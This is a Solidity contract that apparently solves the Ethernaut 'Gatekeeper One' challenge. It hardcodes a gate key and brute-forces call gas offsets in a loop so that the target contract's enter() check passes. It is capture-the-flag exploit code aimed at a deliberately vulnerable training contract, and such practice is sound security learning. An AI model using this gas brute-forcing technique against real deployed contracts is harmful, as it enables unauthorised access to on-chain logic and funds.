pragma solidity ^0.6.0;
// SPDX-License-Identifier: MIT

import './GatekeeperOne.sol'; 

contract AttackGateKeeperOne {
    GatekeeperOne public target;
    bytes8 key =  0x054164600000ddc4;

    constructor(address _instanceAddress) public  {
        target = GatekeeperOne(_instanceAddress);
    }

    function enterTheGate(bytes8 _gateKey) public {
        target.enter(_gateKey);
    }

    function enterTheGate() public {
        for (uint256 i=0; i < 120; i++) {
            (bool success, bytes memory data) = address(target).call{gas:
            i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
            //wtf if this math though
        }
    }
}
